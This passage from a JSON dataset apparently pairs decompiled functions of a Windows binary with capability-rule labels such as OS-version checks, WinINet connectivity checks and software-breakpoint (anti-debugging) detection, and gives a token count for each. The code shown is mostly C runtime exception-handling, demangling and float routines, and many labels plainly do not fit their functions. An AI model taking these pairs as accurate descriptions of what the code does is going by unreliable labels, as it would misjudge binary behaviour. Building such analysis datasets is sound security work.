(*_sym.imp.KERNEL32.dll_DecodePointer)(*0x456c90);\n                        *(unaff_EBP + -0x28) = uVar6;\n                        piVar3 = (*pcVar5)(*0x456c8c);\n                        piVar1 = *(unaff_EBP + -0x28);\n                    } while ((*(unaff_EBP + -0x1c) == piVar1) && (*(unaff_EBP + -0x20) == piVar3));\n                    *(unaff_EBP + -0x1c) = piVar1;\n                    *(unaff_EBP + -0x2c) = piVar1;\n                    *(unaff_EBP + -0x20) = piVar3;\n                    piVar2 = piVar1;\n                } while( true );\n            }\ncode_r0x00406c22:\n            fcn.00406aec(0x42921c, 0x42922c);\n        }\n        fcn.00406aec(0x429230, 0x429234);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040a973(8);\n    }\n    return;\n}\n",
        "token_count": 931
    },
    "00407164": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00407164(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_38h_2;\n    code *pcStack56;\n    uint32_t uStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *var_18h_2;\n    int32_t var_14h_2;\n    uint *var_10h;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    var_18h_2 = &stack0xfffffffc;\n    puStack32 = &stack0xffffffc0;\n    if (var_34h == 0x123) {\n        *var_30h = 0x40720d;\n        var_4h = 1;\n    }\n    else {\n        pcStack56 = fcn.0040705e;\n        uStack52 = *0x443998 ^ &fcn.00407164::var_38h_2;\n        uStack48 = var_24h;\n        puStack44 = var_30h;\n        uStack40 = var_20h;\n        uStack36 = var_1ch;\n        var_14h_2 = 0;\n        var_38h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00407164::var_38h_2;\n        var_4h = 1;\n        var_10h = var_34h;\n        var_ch = var_2ch;\n        iVar1 = fcn.0040c6fd();\n        var_8h = *(iVar1 + 0x80);\n        (*var_8h)(*var_34h, &fcn.00407164::var_10h);\n        var_4h = 0;\n        if (var_14h_2 == 0) {\n            *in_FS_OFFSET = var_38h_2;\n        }\n        else {\n            *var_38h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_38h_2;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 693
    },
    "0040790e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040790e(void)\n\n{\n    uint unaff_EBX;\n    uint in_stack_fffffd2c;\n    uint in_stack_fffffd30;\n    uint var_2c8h;\n    \n    fcn.0040f290();\n    fcn.00407993(unaff_EBX, in_stack_fffffd2c, in_stack_fffffd30);\n    return;\n}\n",
        "token_count": 88
    },
    "0040976d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040976d(uint param_1, uint32_t param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    bool in_ZF;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    uint unaff_retaddr;\n    uint32_t arg_8h;\n    \n    arg_8h = param_2 & 0xffff0000 | in_FPUControlWord;\n    if (in_ZF) {\n        if (((param_4 & 0xfffff) != 0) || (param_3 != 0)) {\n            uVar1 = fcn.0041351c();\n            goto code_r0x004097eb;\n        }\n        uVar1 = param_4 & 0x80000000;\n        if (uVar1 != 0) goto code_r0x004097de;\n    }\n    else {\n        uVar1 = param_4;\n        if (in_FPUControlWord != 0x27f) {\n            uVar1 = fcn.00413505();\n        }\n        if (((uVar1 & 0x80000000) != 0) && ((((uVar1 & 0x7ff00000) != 0 || ((uVar1 & 0xfffff) != 0)) || (param_3 != 0)))\n           ) {\ncode_r0x004097de:\n            uVar1 = 1;\ncode_r0x004097eb:\n            if (*0x445004 == 0) {\n                uVar3 = fcn.004134a7(arg_8h, unaff_retaddr, param_3, param_4);\n                return CONCAT44(arg_8h, uVar3);\n            }\n            goto code_r0x0041358e;\n        }\n    }\n    if (*0x445004 == 0) {\n        uVar2 = uVar1 & 0xffff0000 | arg_8h & 0xffff;\n        if ((arg_8h & 0xffff) != 0x27f) {\n            if (((arg_8h & 0x20) != 0) &&\n               (uVar2 = uVar1 & 0xffff0000 | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0)) {\n                uVar3 = fcn.004134a7(arg_8h, unaff_retaddr, param_3, param_4);\n                return CONCAT44(arg_8h, uVar3);\n            }\n            uVar2 = uVar2 & 0xffff0020;\n        }\n        return CONCAT44(arg_8h, uVar2);\n    }\ncode_r0x0041358e:\n    return CONCAT44(arg_8h, uVar1);\n}\n",
        "token_count": 635
    },
    "0040c384": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c384(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        fcn.0040b3a8();\n        pcVar3 = swi(3);\n        uVar4 = (*pcVar3)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "0040d695": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d695(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x28);\n    fcn.0040736a(*(unaff_EBP + -0x2c));\n    iVar1 = fcn.0040c6fd();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x30);\n    iVar1 = fcn.0040c6fd();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x34);\n    if (((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n         ((unaff_ESI[5] == 0x19930520 || ((unaff_ESI[5] == 0x19930521 || (unaff_ESI[5] == 0x19930522)))))) &&\n        (*(unaff_EBP + -0x38) == 0)) &&\n       ((*(unaff_EBP + -0x1c) != 0 && (iVar1 = fcn.004073ba(unaff_ESI[6]),  iVar1 != 0)))) {\n        fcn.0040d45c(unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 385
    },
    "0040e49f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e49f(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00409270(0x441a68, 0x10);\n    if (*(*(unaff_EBP + 0x10) + 4) < 0x81) {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    else {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar4;\n    iVar3 = fcn.0040c6fd();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar4 != *(unaff_EBP + 0x14)) {\n        if ((iVar4 < 0) || (*(*(unaff_EBP + 0x10) + 4) <= iVar4)) {\n            fcn.0040b370();\n        }\n        iVar3 = *(unaff_EBP + 0x10);\n        iVar1 = *(iVar3 + 8);\n        uVar2 = *(iVar1 + iVar4 * 8);\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + iVar4 * 8) != 0) {\n            iVar1 = *(unaff_EBP + 8);\n            *(iVar1 + 8) = uVar2;\n            fcn.0040d410(*(*(iVar3 + 8) + 4 + iVar4 * 8), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        iVar4 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = iVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040e55e();\n    if (iVar4 != *(unaff_EBP + 0x14)) {\n        fcn.0040b370();\n    }\n    *(*(unaff_EBP + 8) + 8) = iVar4;\n    fcn.004092b5();\n    return;\n}\n",
        "token_count": 615
    },
    "0040e55e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040e55e(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040c6fd();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040c6fd();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "004153f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004153f9(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (**0x445d3c == 0) {\n        fcn.00413d6e(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    var_ch = 0;\n    var_8h = var_8h & 0xffff0000;\n    puVar2 = *0x445d3c + 1;\n    uVar5 = **0x445d3c;\n    uVar4 = 0xffffffff;\n    var_1h._0_1_ = 0;\n    if (0x4e < uVar5) {\n        if (uVar5 == 0x4f) {\n            *0x445d3c = puVar2;\n            fcn.00413b04(\"long \");\n            puVar2 = *0x445d3c;\n            goto code_r0x0041567a;\n        }\n        if (uVar5 < 0x50) goto code_r0x00415648;\n        if (uVar5 < 0x54) {\n            uVar4 = uVar5 & 3;\n            *0x445d3c = puVar2;\n            goto code_r0x00415687;\n        }\n        if (uVar5 == 0x58) {\n            pcVar6 = \"void\";\n            goto code_r0x0041545b;\n        }\n        if (uVar5 != 0x5f) goto code_r0x00415648;\n        uVar3 = *puVar2;\n        puVar2 = *0x445d3c + 2;\n        uVar4 = uVar3;\n        if (uVar4 < 0x4e) {\n            if (uVar4 < 0x4c) {\n                if (uVar4 < 0x48) {\n                    if (uVar4 < 0x46) {\n                        if (uVar4 == 0) {\n                            *0x445d3c = *0x445d3c + 1;\n                            fcn.00413b36(1);\n                            goto code_r0x00415693;\n                        }\n                        if (uVar4 == 0x24) {\n                            *0x445d3c = puVar2;\n                            uVar7 = fcn.004153f9(&var_1ch, arg_ch);\n                            fcn.00413d4a(arg_8h, \"__w64 \", uVar7);\n                            return arg_8h;\n                        }\n                        if (1 < uVar4 - 0x44) goto code_r0x004155ac;\n                        pcVar6 = \"__int8\";\n                    }\n                    else {\n                        pcVar6 = \"__int16\";\n                    }\n                }\n                else if (uVar4 < 0x4a) {\n                    pcVar6 = \"__int32\";\n                }\n                else if (uVar4 < 0x4c) {\n                    pcVar6 = \"__int64\";\n                }\n                else {\ncode_r0x004155ac:\n                    pcVar6 = \"UNKNOWN\";\n                }\n            }\n            else {\n                pcVar6 = \"__int128\";\n            }\n        }\n        else if (uVar4 == 0x4e) {\n            pcVar6 = \"bool\";\n        }\n        else {\n            if (uVar4 == 0x4f) {\n                uVar4 = 0xfffffffe;\n                *0x445d3c = puVar2;\n                goto code_r0x004155cd;\n            }\n            if (uVar4 == 0x52) {\n                pcVar6 = \"<unknown>\";\n            }\n            else {\n                if (uVar4 != 0x57) {\n                    if (1 < uVar4 - 0x58) goto code_r0x004155ac;\n                    *0x445d3c = *0x445d3c + 1;\n                    piVar1 = fcn.0041633d(&var_14h);\n                    var_14h = *piVar1;\n                    var_10h = piVar1[1];\n                    goto joined_r0x00415599;\n                }\n                pcVar6 = \"wchar_t\";\n            }\n        }\n        *0x445d3c = puVar2;\n        fcn.00413b04(pcVar6);\n        goto code_r0x00415693;\n    }\n    // switch table (11 cases) at 0x4157ad\n    switch(uVar5) {\n    case 0x43:\n    case 0x44:\n    case 0x45:\n        pcVar6 = \"char\";\n        break;\n    case 0x46:\n    case 0x47:\n        pcVar6 = \"short\";\n        break;\n    case 0x48:\n    case 0x49:\n        pcVar6 = 0x42e9f4;\n        break;\n    case 0x4a:\n    case 0x4b:\n        pcVar6 = \"long\";\n        break;\n    case 0x4c:\ncode_r0x00415648:\n        piVar1 = fcn.0041633d(&var_24h);\n        var_14h = *piVar1;\n        var_10h = piVar1[1];\n        uVar3 = var_1h;\njoined_r0x00415599:\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == 0) goto code_r0x0041559f;\n        goto code_r0x00415693;\n    case 0x4d:\n        pcVar6 = \"float\";\n        break;\n    default:\ncode_r0x0041567a:\n        *0x445d3c = puVar2;\n        fcn.00413f34(\"double\");\ncode_r0x00415687:\n        uVar3 = var_1h;\n        if (uVar4 != 0xffffffff) {\ncode_r0x004155cd:\n            var_ch = 0;\n            var_8h = var_8h & 0xffff0000;\n            var_1ch = *arg_ch;\n            var_18h = arg_ch[1];\n            if (uVar4 != 0xfffffffe) {\n                if (*arg_ch == 0) {\n                    if ((uVar4 & 1) == 0) {\n                        if ((uVar4 & 2) != 0) {\n                            fcn.00413b04(\"volatile\");\n                        }\n                    }\n                    else {\n                        fcn.00413b04(\"const\");\n                        if ((uVar4 & 2) != 0) {\n                            fcn.00413f34(\" volatile\");\n                        }\n                    }\n                }\n                fcn.00417593(arg_8h, &var_ch, &var_1ch, 0x42e2c4);\n                return arg_8h;\n            }\n            var_18h = var_18h | 0x800;\n            fcn.00417593(&var_14h, &var_ch, &var_1ch, 0x42bb88);\n            if ((var_10h & 0x800) == 0) {\n                fcn.00413f34(0x42e2b0);\n            }\ncode_r0x0041559f:\n            *arg_8h = var_14h;\n            arg_8h[1] = var_10h;\n            return arg_8h;\n        }\n        goto code_r0x00415693;\n    }\ncode_r0x0041545b:\n    *0x445d3c = puVar2;\n    fcn.00413b04(pcVar6);\n    uVar3 = var_1h;\ncode_r0x00415693:\n    if (uVar5 == 0x43) {\n        pcVar6 = \"signed \";\n    }\n    else {\n        if (((((uVar5 != 0x45) && (uVar5 != 0x47)) && (uVar5 != 0x49)) && (uVar5 != 0x4b)) &&\n           ((uVar5 != 0x5f ||\n            (((uVar3 != 0x45 && (uVar3 != 0x47)) && ((uVar3 != 0x49 && ((uVar3 != 0x4b && (uVar3 != 0x4d))))))))))\n        goto code_r0x004156ff;\n        pcVar6 = \"unsigned \";\n    }\n    puVar8 = &var_1ch;\n    fcn.004137b4(pcVar6);\n    fcn.00413d92(pcVar6, puVar8);\n    var_ch = var_1ch;\n    var_8h = var_18h;\ncode_r0x004156ff:\n    if (*arg_ch != 0) {\n        puVar8 = &var_1ch;\n        uVar7 = 0x20;\n        fcn.0041373b(0x20);\n        fcn.00413d92(uVar7, puVar8);\n        fcn.00413e3c(&var_1ch);\n    }\n    *arg_8h = var_ch;\n    arg_8h[1] = var_8h;\n    return arg_8h;\n}\n",
        "token_count": 2218
    },
    "0041f089": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0041f089(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443998 ^ &stack0xfffffffc;\n    uVar1 = arg_8h[5];\n    iVar14 = 0;\n    uVar10 = uVar1 & 0x7fff;\n    uVar16 = *(arg_8h + 3);\n    iVar11 = uVar10 - 0x3fff;\n    var_10h = uVar16;\n    uVar17 = *(arg_8h + 1);\n    var_ch = uVar17;\n    uVar2 = *arg_8h;\n    var_8h = uVar2 << 0x10;\n    uVar3 = str.5_v_[1];\n    if (iVar11 == -0x3fff) {\n        iVar15 = 0;\n        iVar11 = 0;\n        do {\n            if ((&var_10h)[iVar11] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                goto code_r0x0041f0fe;\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 3);\n    }\n    else {\n        iVar6 = str.5_v_[0] + L'\\xffffffff';\n        bVar5 = false;\n        iVar15 = (str.5_v_[0] >> 0x1f & 0x1fU) + str.5_v_[0] >> 5;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if (((&var_10h)[iVar15] & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar7 = (&var_10h)[iVar15] & ~(-1 << (uVar8 & 0x1f));\n            iVar12 = iVar15;\n            while (uVar7 == 0) {\n                iVar12 = iVar12 + 1;\n                if (2 < iVar12) goto code_r0x0041f1fe;\n                uVar7 = (&var_10h)[iVar12];\n            }\n            iVar12 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n            bVar5 = false;\n            uVar7 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n            uVar9 = uVar7 + (&var_10h)[iVar12];\n            bVar4 = false;\n            if ((uVar9 < (&var_10h)[iVar12]) || (uVar9 < uVar7)) {\n                bVar4 = true;\n                bVar5 = true;\n            }\n            (&var_10h)[iVar12] = uVar9;\n            while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar4))) {\n                bVar4 = false;\n                bVar5 = false;\n                uVar7 = (&var_10h)[iVar12] + 1;\n                if ((uVar7 < (&var_10h)[iVar12]) || (uVar7 == 0)) {\n                    bVar4 = true;\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar12] = uVar7;\n            }\n        }\ncode_r0x0041f1fe:\n        (&var_10h)[iVar15] = (&var_10h)[iVar15] & -1 << (uVar8 & 0x1f);\n        iVar15 = iVar15 + 1;\n        if (iVar15 < 3) {\n            puVar13 = &var_10h + iVar15;\n            for (iVar12 = 3 - iVar15; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *puVar13 = 0;\n                puVar13 = puVar13 + 1;\n            }\n        }\n        iVar15 = iVar11;\n        if (bVar5) {\n            iVar15 = uVar10 - 0x3ffe;\n        }\n        if (iVar15 < *0x443ef8 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x443ef8 < iVar15) {\n                if (iVar15 < *0x443ef4) {\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar15 = str.5_v_[3] + iVar15;\n                    iVar11 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    iVar14 = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar11 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar15 = str.5_v_[3] + *0x443ef4;\n                }\n                goto code_r0x0041f5af;\n            }\n            iVar11 = *0x443ef8 - iVar11;\n            var_10h = uVar16;\n            iVar15 = iVar11 + (iVar11 >> 0x1f & 0x1fU) >> 5;\n            var_ch = uVar17;\n            var_8h = uVar2 << 0x10;\n            uVar8 = iVar11 & 0x1f;\n            var_20h = 0;\n            do {\n                uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                (&var_10h)[iVar14] = uVar16;\n                iVar14 = iVar14 + 1;\n            } while (iVar14 < 3);\n            puVar13 = &var_8h + -iVar15;\n            iVar11 = 2;\n            do {\n                if (iVar11 < iVar15) {\n                    (&var_10h)[iVar11] = 0;\n                }\n                else {\n                    (&var_10h)[iVar11] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar11 = iVar11 + -1;\n            } while (-1 < iVar11);\n            iVar11 = (str.5_v_[0] >> 0x1f & 0x1fU) + str.5_v_[0] >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            if (((&var_10h)[iVar11] & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar16 = (&var_10h)[iVar11] & ~(-1 << (uVar8 & 0x1f));\n                iVar14 = iVar11;\n                while (uVar16 == 0) {\n                    iVar14 = iVar14 + 1;\n                    if (2 < iVar14) goto code_r0x0041f3b9;\n                    uVar16 = (&var_10h)[iVar14];\n                }\n                iVar14 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n                uVar16 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n                bVar5 = false;\n                uVar17 = uVar16 + (&var_10h)[iVar14];\n                if ((uVar17 < (&var_10h)[iVar14]) || (uVar17 < uVar16)) {\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar14] = uVar17;\n                while ((iVar14 = iVar14 + -1,  -1 < iVar14 && (bVar5))) {\n                    bVar5 = false;\n                    uVar16 = (&var_10h)[iVar14] + 1;\n                    if ((uVar16 < (&var_10h)[iVar14]) || (uVar16 == 0)) {\n                        bVar5 = true;\n                    }\n                    (&var_10h)[iVar14] = uVar16;\n                }\n            }\ncode_r0x0041f3b9:\n            (&var_10h)[iVar11] = (&var_10h)[iVar11] & -1 << (uVar8 & 0x1f);\n            iVar11 = iVar11 + 1;\n            if (iVar11 < 3) {\n                puVar13 = &var_10h + iVar11;\n                for (iVar14 = 3 - iVar11; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n            }\n            iVar14 = str.5_v_[1] + L'\\x01';\n            iVar11 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar14 & 0x1f;\n            var_20h = 0;\n            var_34h = 0;\n            do {\n                uVar16 = (&var_10h)[var_34h];\n                (&var_10h)[var_34h] = uVar16 >> uVar8 | var_20h;\n                var_20h = (uVar16 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_34h = var_34h + 1;\n            } while (var_34h < 3);\n            puVar13 = &var_8h + -iVar11;\n            iVar14 = 2;\n            do {\n                if (iVar14 < iVar11) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\ncode_r0x0041f0fe:\n        iVar15 = 0;\n    }\ncode_r0x0041f5af:\n    uVar16 = iVar15 << (0x1f - uVar3 & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar16;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar16;\n    }\n    fcn.00406eb1(uVar1 & 0x8000);\n    return;\n}\n",
        "token_count": 3234
    },
    "0041f5fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
